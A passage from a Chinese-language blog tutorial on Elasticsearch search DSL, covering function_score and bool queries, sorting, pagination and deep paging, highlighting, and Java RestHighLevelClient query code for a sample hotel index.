class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET /hotel/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;function_score&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;query&quot;</span>: &#123;  .... &#125;, <span class="comment">// 原始查询，可以是任意条件</span></span><br><span class="line">      <span class="attr">&quot;functions&quot;</span>: [ <span class="comment">// 算分函数</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;filter&quot;</span>: &#123; <span class="comment">// 满足的条件，品牌必须是如家</span></span><br><span class="line">            <span class="attr">&quot;term&quot;</span>: &#123;</span><br><span class="line">              <span class="attr">&quot;brand&quot;</span>: <span class="string">&quot;如家&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">&quot;weight&quot;</span>: <span class="number">2</span> <span class="comment">// 算分权重为2</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;boost_mode&quot;</span>: <span class="string">&quot;sum&quot;</span> <span class="comment">// 加权模式，求和</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试，在未添加算分函数时，如家得分如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492248-817c4411-b68d-421e-a1ad-65cbf7c9d786.png#averageHue=%23f0f4f9&crop=0&crop=0&crop=1&crop=1&id=SUIpi&originHeight=444&originWidth=1340&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />添加了算分函数后，如家得分就提升了：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492372-5644632e-653c-4a0f-9dc5-bfe5d63f234e.png#averageHue=%23eef3f8&crop=0&crop=0&crop=1&crop=1&id=jML3i&originHeight=568&originWidth=1402&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="m2oYy"></a></p><h4 id="3）小结"><a href="#3）小结" class="headerlink" title="3）小结"></a>3）小结</h4><p>function score query定义的三要素是什么？</p><ul><li><p>过滤条件：哪些文档要加分</p></li><li><p>算分函数：如何计算function score</p></li><li><p>加权方式：function score 与 query score如何运算<br><a name="H8qsR"></a></p><h3 id="1-5-3-布尔查询"><a href="#1-5-3-布尔查询" class="headerlink" title="1.5.3.布尔查询"></a>1.5.3.布尔查询</h3><p>布尔查询是一个或多个查询子句的组合，每一个子句就是一个<strong>子查询</strong>。子查询的组合方式有：</p></li><li><p>must：必须匹配每个子查询，类似“与”</p></li><li><p>should：选择性匹配子查询，类似“或”</p></li><li><p>must_not：必须不匹配，<strong>不参与算分</strong>，类似“非”</p></li><li><p>filter：必须匹配，<strong>不参与算分</strong></p></li></ul><p>比如在搜索酒店时，除了关键字搜索外，我们还可能根据品牌、价格、城市等字段做过滤：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492523-1dc17c69-429e-4198-ad9f-587bff4d51a1.png#crop=0&crop=0&crop=1&crop=1&id=Gw9NO&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />每一个不同的字段，其查询的条件、方式都不一样，必须是多个不同的查询，而要组合这些查询，就必须用bool查询了。<br />需要注意的是，搜索时，参与<strong>打分的字段越多，查询的性能也越差</strong>。因此这种多条件查询时，建议这样做：</p><ul><li><p>搜索框的关键字搜索，是全文检索查询，使用must查询，参与算分</p></li><li><p>其它过滤条件，采用filter查询。不参与算分<br><a name="mXen0"></a></p><h4 id="1）语法示例："><a href="#1）语法示例：" class="headerlink" title="1）语法示例："></a>1）语法示例：</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET /hotel/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;bool&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;must&quot;</span>: [</span><br><span class="line">        &#123;<span class="attr">&quot;term&quot;</span>: &#123;<span class="attr">&quot;city&quot;</span>: <span class="string">&quot;上海&quot;</span> &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;should&quot;</span>: [</span><br><span class="line">        &#123;<span class="attr">&quot;term&quot;</span>: &#123;<span class="attr">&quot;brand&quot;</span>: <span class="string">&quot;皇冠假日&quot;</span> &#125;&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;term&quot;</span>: &#123;<span class="attr">&quot;brand&quot;</span>: <span class="string">&quot;华美达&quot;</span> &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;must_not&quot;</span>: [</span><br><span class="line">        &#123; <span class="attr">&quot;range&quot;</span>: &#123; <span class="attr">&quot;price&quot;</span>: &#123; <span class="attr">&quot;lte&quot;</span>: <span class="number">500</span> &#125; &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;filter&quot;</span>: [</span><br><span class="line">        &#123; <span class="attr">&quot;range&quot;</span>: &#123;<span class="attr">&quot;score&quot;</span>: &#123; <span class="attr">&quot;gte&quot;</span>: <span class="number">45</span> &#125; &#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="DtuOc"></a></p><h4 id="2）示例-1"><a href="#2）示例-1" class="headerlink" title="2）示例"></a>2）示例</h4><p>需求：搜索名字包含“如家”，价格不高于400，在坐标31.21,121.5周围10km范围内的酒店。<br />分析：</p></li><li><p>名称搜索，属于全文检索查询，应该参与算分。放到must中</p></li><li><p>价格不高于400，用range查询，属于过滤条件，不参与算分。放到must_not中</p></li><li><p>周围10km范围内，用geo_distance查询，属于过滤条件，不参与算分。放到filter中</p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492606-d72216b0-1d28-4c6a-af46-3e68dbf2f137.png#crop=0&crop=0&crop=1&crop=1&id=U3kx0&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="yGKJH"></a></p><h4 id="3）小结-1"><a href="#3）小结-1" class="headerlink" title="3）小结"></a>3）小结</h4><p>bool查询有几种逻辑关系？</p><ul><li><p>must：必须匹配的条件，可以理解为“与”</p></li><li><p>should：选择性匹配的条件，可以理解为“或”</p></li><li><p>must_not：必须不匹配的条件，不参与打分</p></li><li><p>filter：必须匹配的条件，不参与打分<br><a name="uHHyB"></a></p><h1 id="2-搜索结果处理"><a href="#2-搜索结果处理" class="headerlink" title="2.搜索结果处理"></a>2.搜索结果处理</h1><p>搜索的结果可以按照用户指定的方式去处理或展示。<br><a name="Nfc3U"></a></p><h2 id="2-1-排序"><a href="#2-1-排序" class="headerlink" title="2.1.排序"></a>2.1.排序</h2><p>elasticsearch默认是根据相关度算分（_score）来排序，但是也支持自定义方式对搜索<a href="https://_www.elastic.co_guide_en_elasticsearch_reference_current_sort-search-results/">结果排序</a>。可以排序字段类型有：keyword类型、数值类型、地理坐标类型、日期类型等。<br><a name="ET6BV"></a></p><h3 id="2-1-1-普通字段排序"><a href="#2-1-1-普通字段排序" class="headerlink" title="2.1.1.普通字段排序"></a>2.1.1.普通字段排序</h3><p>keyword、数值、日期类型排序的语法基本一致。<br /><strong>语法</strong>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: <span class="string">&quot;desc&quot;</span>  <span class="comment">// 排序字段、排序方式ASC、DESC</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>排序条件是一个数组，也就是可以写多个排序条件。按照声明的顺序，当第一个条件相等时，再按照第二个条件排序，以此类推<br /><strong>示例</strong>：<br />需求描述：酒店数据按照用户评价（score)降序排序，评价相同的按照价格(price)升序排序<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492745-bedb9856-69f2-4a13-a5a2-3b6598f4c735.png#crop=0&crop=0&crop=1&crop=1&id=ndvIJ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="dqDbO"></a></p><h3 id="2-1-2-地理坐标排序"><a href="#2-1-2-地理坐标排序" class="headerlink" title="2.1.2.地理坐标排序"></a>2.1.2.地理坐标排序</h3><p>地理坐标排序略有不同。<br /><strong>语法说明</strong>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;_geo_distance&quot;</span> : &#123;</span><br><span class="line">          <span class="attr">&quot;FIELD&quot;</span> : <span class="string">&quot;纬度，经度&quot;</span>, <span class="comment">// 文档中geo_point类型的字段名、目标坐标点</span></span><br><span class="line">          <span class="attr">&quot;order&quot;</span> : <span class="string">&quot;asc&quot;</span>, <span class="comment">// 排序方式</span></span><br><span class="line">          <span class="attr">&quot;unit&quot;</span> : <span class="string">&quot;km&quot;</span> <span class="comment">// 排序的距离单位</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个查询的含义是：</p></li><li><p>指定一个坐标，作为目标点</p></li><li><p>计算每一个文档中，指定字段（必须是geo_point类型）的坐标 到目标点的距离是多少</p></li><li><p>根据距离排序</p></li></ul><p><strong>示例：</strong><br />需求描述：实现对酒店数据按照到你的位置坐标的距离升序排序<br />提示：获取你的位置的经纬度的方式：<a href="https://lbs.amap.com/demo/jsapi-v2/example/map/click-to-get-lnglat/">https://lbs.amap.com/demo/jsapi-v2/example/map/click-to-get-lnglat/</a><br />假设我的位置是：31.034661，121.612282，寻找我周围距离最近的酒店。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492847-628ecb7c-3f46-4c4e-8da3-d120e861fd5f.png#crop=0&crop=0&crop=1&crop=1&id=gmSeC&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="iimGN"></a></p><h2 id="2-2-分页"><a href="#2-2-分页" class="headerlink" title="2.2.分页"></a>2.2.分页</h2><p>elasticsearch 默认情况下只返回top10的数据。而如果要查询更多数据就需要修改分页参数了。elasticsearch中通过修改from、size参数来控制要返回的分页结果：</p><ul><li>from：从第几个文档开始</li><li>size：总共查询几个文档</li></ul><p>类似于mysql中的<code>limit ?, ?</code><br><a name="VFQue"></a></p><h3 id="2-2-1-基本的分页"><a href="#2-2-1-基本的分页" class="headerlink" title="2.2.1.基本的分页"></a>2.2.1.基本的分页</h3><p>分页的基本语法如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /hotel/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;from&quot;</span>: <span class="number">0</span>, <span class="comment">// 分页开始的位置，默认为0</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span>: <span class="number">10</span>, <span class="comment">// 期望获取的文档总数</span></span><br><span class="line">  <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;<span class="attr">&quot;price&quot;</span>: <span class="string">&quot;asc&quot;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="pacqf"></a></p><h3 id="2-2-2-深度分页问题"><a href="#2-2-2-深度分页问题" class="headerlink" title="2.2.2.深度分页问题"></a>2.2.2.深度分页问题</h3><p>现在，我要查询990~1000的数据，查询逻辑要这么写：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /hotel/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;from&quot;</span>: <span class="number">990</span>, <span class="comment">// 分页开始的位置，默认为0</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span>: <span class="number">10</span>, <span class="comment">// 期望获取的文档总数</span></span><br><span class="line">  <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;<span class="attr">&quot;price&quot;</span>: <span class="string">&quot;asc&quot;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是查询990开始的数据，也就是 第990<del>第1000条 数据。<br />不过，elasticsearch内部分页时，必须先查询 0</del>1000条，然后截取其中的990 ~ 1000的这10条：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492964-71c4dce9-8c55-45e9-a212-197347ea1e1d.png#crop=0&crop=0&crop=1&crop=1&id=hgCFJ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />查询TOP1000，如果es是单点模式，这并无太大影响。<br />但是elasticsearch将来一定是集群，例如我集群有5个节点，我要查询TOP1000的数据，并不是每个节点查询200条就可以了。<br />因为节点A的TOP200，在另一个节点可能排到10000名以外了。<br />因此要想获取整个集群的TOP1000，必须先查询出每个节点的TOP1000，汇总结果后，重新排名，重新截取TOP1000。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493047-7c110509-bf9d-49ae-ad1b-7213cd91e371.png#crop=0&crop=0&crop=1&crop=1&id=EJsoD&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />那如果我要查询9900~10000的数据呢？是不是要先查询TOP10000呢？那每个节点都要查询10000条？汇总到内存中？<br />当查询分页深度较大时，汇总数据过多，对内存和CPU会产生非常大的压力，因此elasticsearch会禁止from+ size 超过10000的请求。<br />针对深度分页，ES提供了两种解决方案，<a href="https://_www.elastic.co_guide_en_elasticsearch_reference_current_paginate-search-results/">官方文档</a>：</p><ul><li><p>search after：分页时需要排序，原理是从上一次的排序值开始，查询下一页数据。官方推荐使用的方式。</p></li><li><p>scroll：原理将排序后的文档id形成快照，保存在内存。官方已经不推荐使用。<br><a name="uFEyF"></a></p><h3 id="2-2-3-小结"><a href="#2-2-3-小结" class="headerlink" title="2.2.3.小结"></a>2.2.3.小结</h3><p>分页查询的常见实现方案以及优缺点：</p></li><li><p><code>from + size</code>：</p><ul><li>优点：支持随机翻页</li><li>缺点：深度分页问题，默认查询上限（from + size）是10000</li><li>场景：百度、京东、谷歌、淘宝这样的随机翻页搜索</li></ul></li><li><p><code>after search</code>：</p><ul><li>优点：没有查询上限（单次查询的size不超过10000）</li><li>缺点：只能向后逐页查询，不支持随机翻页</li><li>场景：没有随机翻页需求的搜索，例如手机向下滚动翻页</li></ul></li><li><p><code>scroll</code>：</p><ul><li>优点：没有查询上限（单次查询的size不超过10000）</li><li>缺点：会有额外内存消耗，并且搜索结果是非实时的</li><li>场景：海量数据的获取和迁移。从ES7.1开始不推荐，建议用 after search方案。<br><a name="c4vBF"></a><h2 id="2-3-高亮"><a href="#2-3-高亮" class="headerlink" title="2.3.高亮"></a>2.3.高亮</h2><a name="AoJ4q"></a><h3 id="2-3-1-高亮原理"><a href="#2-3-1-高亮原理" class="headerlink" title="2.3.1.高亮原理"></a>2.3.1.高亮原理</h3>什么是高亮显示呢？<br />我们在百度，京东搜索时，关键字会变成红色，比较醒目，这叫高亮显示：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493133-cfbc56a0-3f3c-4ac4-a944-4a9a9fff6ae2.png#crop=0&crop=0&crop=1&crop=1&id=wvmDs&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />高亮显示的实现分为两步：</li></ul></li><li><p>1）给文档中的所有关键字都添加一个标签，例如<code>&lt;em&gt;</code>标签</p></li><li><p>2）页面给<code>&lt;em&gt;</code>标签编写CSS样式<br><a name="DdXpw"></a></p><h3 id="2-3-2-实现高亮"><a href="#2-3-2-实现高亮" class="headerlink" title="2.3.2.实现高亮"></a>2.3.2.实现高亮</h3></li></ul><p><strong>高亮的语法</strong>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /hotel/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: <span class="string">&quot;TEXT&quot;</span> <span class="comment">// 查询条件，高亮一定要使用全文检索查询</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;highlight&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;fields&quot;</span>: &#123; <span class="comment">// 指定要高亮的字段</span></span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;pre_tags&quot;</span>: <span class="string">&quot;&lt;em&gt;&quot;</span>,  <span class="comment">// 用来标记高亮字段的前置标签</span></span><br><span class="line">        <span class="attr">&quot;post_tags&quot;</span>: <span class="string">&quot;&lt;/em&gt;&quot;</span> <span class="comment">// 用来标记高亮字段的后置标签</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>高亮是对关键字高亮，因此<strong>搜索条件必须带有关键字</strong>，而不能是范围这样的查询。</li><li>默认情况下，<strong>高亮的字段，必须与搜索指定的字段一致</strong>，否则无法高亮</li><li>如果要对非搜索字段高亮，则需要添加一个属性：required_field_match=false</li></ul><p><strong>示例</strong>：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493238-db0da126-e3de-4e7a-92a8-c32833e20160.png#crop=0&crop=0&crop=1&crop=1&id=B54no&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="bFCA7"></a></p><h2 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4.总结"></a>2.4.总结</h2><p>查询的DSL是一个大的JSON对象，包含下列属性：</p><ul><li>query：查询条件</li><li>from和size：分页条件</li><li>sort：排序条件</li><li>highlight：高亮条件</li></ul><p>示例：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493354-9794652a-3b39-4e01-a152-eb99436247fb.png#crop=0&crop=0&crop=1&crop=1&id=LqpcM&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="Gcds8"></a></p><h1 id="3-RestClient查询文档"><a href="#3-RestClient查询文档" class="headerlink" title="3.RestClient查询文档"></a>3.RestClient查询文档</h1><p>文档的查询同样适用昨天学习的 RestHighLevelClient对象，基本步骤包括：</p><ul><li><p>1）准备Request对象</p></li><li><p>2）准备请求参数</p></li><li><p>3）发起请求</p></li><li><p>4）解析响应<br><a name="Q86qC"></a></p><h2 id="3-1-快速入门"><a href="#3-1-快速入门" class="headerlink" title="3.1.快速入门"></a>3.1.快速入门</h2><p>我们以match_all查询为例<br><a name="kfL1y"></a></p><h3 id="3-1-1-发起查询请求"><a href="#3-1-1-发起查询请求" class="headerlink" title="3.1.1.发起查询请求"></a>3.1.1.发起查询请求</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493440-cf56f498-34d3-4e4a-b700-932289b4139d.png#crop=0&crop=0&crop=1&crop=1&id=PcXeM&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />代码解读：</p></li><li><p>第一步，创建<code>SearchRequest</code>对象，指定索引库名</p></li><li><p>第二步，利用<code>request.source()</code>构建DSL，DSL中可以包含查询、分页、排序、高亮等</p><ul><li><code>query()</code>：代表查询条件，利用<code>QueryBuilders.matchAllQuery()</code>构建一个match_all查询的DSL</li></ul></li><li><p>第三步，利用client.search()发送请求，得到响应</p></li></ul><p>这里关键的API有两个，一个是<code>request.source()</code>，其中包含了查询、排序、分页、高亮等所有功能：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493525-bd78e7f4-cb40-484e-8d27-e427bf92d82f.png#crop=0&crop=0&crop=1&crop=1&id=hyoqn&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />另一个是<code>QueryBuilders</code>，其中包含match、term、function_score、bool等各种查询：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493628-5a0dc86a-057d-4d63-a7ef-066a92c33a12.png#crop=0&crop=0&crop=1&crop=1&id=pWnaH&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="lnXTZ"></a></p><h3 id="3-1-2-解析响应"><a href="#3-1-2-解析响应" class="headerlink" title="3.1.2.解析响应"></a>3.1.2.解析响应</h3><p>响应结果的解析：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493732-1de1fd56-86bc-4274-8068-c0a9ace82388.png#crop=0&crop=0&crop=1&crop=1&id=P5XJT&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />elasticsearch返回的结果是一个JSON字符串，结构包含：</p><ul><li><code>hits</code>：命中的结果<ul><li><code>total</code>：总条数，其中的value是具体的总条数值</li><li><code>max_score</code>：所有结果中得分最高的文档的相关性算分</li><li><code>hits</code>：搜索结果的文档数组，其中的每个文档都是一个json对象<ul><li><code>_source</code>：文档中的原始数据，也是json对象</li></ul></li></ul></li></ul><p>因此，我们解析响应结果，就是逐层解析JSON字符串，流程如下：</p><ul><li><code>SearchHits</code>：通过response.getHits()获取，就是JSON中的最外层的hits，代表命中的结果<ul><li><code>SearchHits#getTotalHits().value</code>：获取总条数信息</li><li><code>SearchHits#getHits()</code>：获取SearchHit数组，也就是文档数组<ul><li><code>SearchHit#getSourceAsString()</code>：获取文档结果中的_source，也就是原始的json文档数据<br><a name="fUDpm"></a><h3 id="3-1-3-完整代码"><a href="#3-1-3-完整代码" class="headerlink" title="3.1.3.完整代码"></a>3.1.3.完整代码</h3>完整代码如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testMatchAll</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1.准备Request</span></span><br><span class="line">    SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.准备DSL</span></span><br><span class="line">    request.source()</span><br><span class="line">        .query(QueryBuilders.matchAllQuery());</span><br><span class="line">    <span class="comment">// 3.发送请求</span></span><br><span class="line">    SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    handleResponse(response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleResponse</span><span class="params">(SearchResponse response)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    SearchHits searchHits = response.getHits();</span><br><span class="line">    <span class="comment">// 4.1.获取总条数</span></span><br><span class="line">    <span class="keyword">long</span> total = searchHits.getTotalHits().value;</span><br><span class="line">    System.out.println(<span class="string">&quot;共搜索到&quot;</span> + total + <span class="string">&quot;条数据&quot;</span>);</span><br><span class="line">    <span class="comment">// 4.2.文档数组</span></span><br><span class="line">    SearchHit[] hits = searchHits.getHits();</span><br><span class="line">    <span class="comment">// 4.3.遍历</span></span><br><span class="line">    <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">        <span class="comment">// 获取文档source</span></span><br><span class="line">        String json = hit.getSourceAsString();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        HotelDoc hotelDoc = JSON.parseObject(json, HotelDoc.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;hotelDoc = &quot;</span> + hotelDoc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a name="Hojaa"></a><h3 id="3-1-4-小结"><a href="#3-1-4-小结" class="headerlink" title="3.1.4.小结"></a>3.1.4.小结</h3>查询的基本步骤是：</li></ul></li></ul></li></ul><ol><li>创建SearchRequest对象</li><li>准备Request.source()，也就是DSL。<br />① QueryBuilders来构建查询条件<br />② 传入Request.source() 的 query() 方法</li><li>发送请求，得到结果</li><li>解析结果（参考JSON结果，从外到内，逐层解析）<br><a name="d21au"></a><h2 id="3-2-match查询"><a href="#3-2-match查询" class="headerlink" title="3.2.match查询"></a>3.2.match查询</h2>全文检索的match和multi_match查询与match_all的API基本一致。差别是查询条件，也就是query的部分。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493834-27e3a085-dd03-46db-ac9e-93d5704d262e.png#crop=0&crop=0&crop=1&crop=1&id=YPdY7&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />因此，Java代码上的差异主要是request.source().query()中的参数了。同样是利用QueryBuilders提供的方法：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493916-d328ce68-ae46-4d4e-9d3b-9e33f49d94c5.png#crop=0&crop=0&crop=1&crop=1&id=cxC8D&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />而结果解析代码则完全一致，可以抽取并共享。<br />完整代码如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testMatch</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1.准备Request</span></span><br><span class="line">    SearchRequest request = <span class="keyword">new</span> SearchRequest(<span 